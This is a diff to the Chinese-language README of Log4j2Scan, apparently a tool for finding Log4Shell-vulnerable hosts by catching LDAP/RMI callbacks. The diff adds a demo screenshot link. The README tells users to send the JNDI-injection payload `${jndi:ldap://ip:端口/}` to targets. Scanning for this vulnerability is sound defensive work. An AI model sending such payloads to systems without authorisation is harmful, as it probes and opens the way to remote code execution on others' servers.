@@ -17,7 +17,8 @@
 
 ## 使用
 
-发送 `${jndi:ldap://ip:端口/}` payload ，如果目标存在漏洞，该项目就会收到 ldap/rmi 请求从而快速定位哪些目标存在漏洞
+发送 `${jndi:ldap://ip:端口/}` payload ，如果目标存在漏洞，该项目就会收到 ldap/rmi 请求，从而快速定位哪些目标存在漏洞，Demo 如下
+![](https://github.com/KpLi0rn/Log4j2Scan/blob/main/img/002.png)
 
 根据自己操作系统下载对应的可执行文件：[下载地址](https://github.com/KpLi0rn/Log4j2Scan/releases/tag/v0.0.1)
 
